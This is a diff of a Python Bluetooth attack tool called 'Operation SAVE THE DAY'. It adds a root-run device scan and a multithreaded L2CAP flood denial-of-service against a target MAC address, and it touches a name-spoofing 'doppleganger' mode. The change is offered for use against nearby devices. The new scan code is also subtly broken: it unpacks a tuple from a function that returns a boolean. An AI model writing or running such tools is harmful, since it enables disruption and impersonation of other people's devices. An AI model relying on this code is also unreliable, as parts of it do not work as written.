@@ -2,11 +2,14 @@ import argparse
 import subprocess
 import threading
 import time
+import signal
+import sys
 
 def run_root_command(cmd: list, desc: str = ""):
     try:
         full_cmd = ["su", "-c", " ".join(cmd)] if isinstance(cmd, list) else ["su", "-c", cmd]
         result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=10)
+
         if result.returncode == 0:
             print(f"[+] {desc} Success")
             return True
@@ -17,6 +20,20 @@ def run_root_command(cmd: list, desc: str = ""):
         print(f"[-] {desc} Error: {e}")
         return False
 
+def locator():
+    print(f"\n{'MAC Address':<40} Device Name")
+    print("-" * 70)
+
+    print("***Trying BlueZ scan...")
+
+    run_root_command("hciconfig hci0 up 2>/dev/null || true", "")
+    
+    success, scan = run_root_command("timeout 12s hcitool scan 2>/dev/null || echo 'No scan output'")
+    
+    if success and scan and len(scan) > 20:
+        print(scan)
+    else:
+        print("[-] Scan failed. Try these commands manually:...")
 
 def DOS(mac_address: str, packet_size: str):
     try:
@@ -28,8 +45,18 @@ def DOS(mac_address: str, packet_size: str):
 
 
 def attack(mac_address: str, packet_size: str = "600", threads: int = 5):
-    print(f"*** Starting attack on {mac_address} | Size: {packet_size} | Threads: {threads}")
+    print(f"*** Starting L2CAP flood on {mac_address} with {threads} threads ***")
     
+    stop_event = threading.Event()
+    
+    def signal_handler(sig, frame):
+        print("\n[!] Stopping attack...")
+        stop_event.set()
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    active_threads = []
     for i in range(threads):
         t = threading.Thread(target=DOS, args=(mac_address, packet_size), daemon=True)
         t.start()
@@ -80,14 +107,12 @@ def doppleganger(new_name: str, mode: str = "bridge"):
 
 
 def main():
-    parser = argparse.ArgumentParser(description='Operation "SAVE THE DAY" ')
-
-    parser.add_argument("-scan", action="store_true", help="Scan (placeholder)")
+    parser = argparse.ArgumentParser(description='OPERATION "SAVE THE DAY"')
+    parser.add_argument("-scan", action="store_true", help="Scan nearby Bluetooth devices")
     
-    parser.add_argument("-attack", metavar="MAC", help="Start L2CAP flood")
-    parser.add_argument("-mac", type=str, help="Target MAC address")
-    parser.add_argument("-size", type=str, default="600", help="Packet size (default 600)")
-    parser.add_argument("-thread", type=int, default=5, help="Number of threads (default 5)")
+    parser.add_argument("-attack", metavar="MAC", help="Start L2CAP flood attack on target MAC")
+    parser.add_argument("-size", type=str, default="600", help="Packet size for flood (default: 600)")
+    parser.add_argument("-thread", type=int, default=5, help="Number of threads (default: 5)")
     
     parser.add_argument("-dopple", action="store_true", help="Enable Doppleganger mode")
     parser.add_argument("-name", type=str, default="POMINAY_IMYA", help="New Bluetooth name")
@@ -102,11 +127,7 @@ def main():
         return
 
     if args.attack:
-        mac = args.attack if not args.mac else args.mac
-        if not mac:
-            print("[-] Please provide MAC with -mac or directly after -attack")
-            return
-        attack(mac, args.size, args.thread)
+        attack(args.attack, args.size, args.thread)
         return
 
     if args.dopple:
